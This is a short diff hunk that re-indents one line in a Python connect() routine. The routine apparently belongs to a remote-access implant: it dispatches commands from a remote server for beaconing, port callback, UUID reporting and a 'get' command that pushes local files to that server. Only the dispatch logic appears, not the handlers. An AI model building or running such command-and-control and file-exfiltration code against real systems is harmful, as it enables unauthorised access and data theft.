@@ -300,7 +300,7 @@ def connect(remote_ip=remote_ip, remote_port=remote_port):
             elif "[BEACON]" in data:
                 beacon(conn, data)
             elif "[PORT]" in data:
-            callback_port(conn,data)
+                callback_port(conn,data)
             elif "[UUID]" in data:
                 push_uuid(conn)
             elif "[get]" in data:  #find file locally then push to remote server
